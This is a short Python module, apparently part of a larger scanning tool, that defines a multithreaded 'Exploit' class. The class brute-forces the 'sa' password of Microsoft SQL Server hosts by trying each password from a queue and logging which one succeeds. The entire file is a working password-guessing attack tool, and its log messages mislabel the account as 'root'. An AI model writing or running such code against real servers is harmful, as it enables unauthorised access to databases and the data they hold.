# coding:utf-8
import pymssql
import threading
from Libs.methods import *
from Libs.glo import *

event = getThrEvent()           # 获取线程事件
event.set()
q = getQueue()                          #队列必须使用多进程的队列，使用queue模块会报错

#自定义多线程类
class Exploit(threading.Thread):
    def __init__(self, ip, port, q_pwdCopy):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.q_pwdCopy = q_pwdCopy           # 获取密码

    def run(self):
        while event.is_set():
            if self.q_pwdCopy.empty():
                break
            else:
                pwd = self.q_pwdCopy.get()
                try:
                    pymssql.connect(server=self.ip, user='sa', password=pwd, port=self.port, login_timeout=5)
                    logger.info('[+] [{}:{} --> u:{}   p:{}]'.format(self.ip, self.port, 'root', pwd))
                    break
                except Exception as e:
                    logger.info('[-] [{}:{} --> u:{}   p:{}]'.format(self.ip, self.port, 'root', pwd))
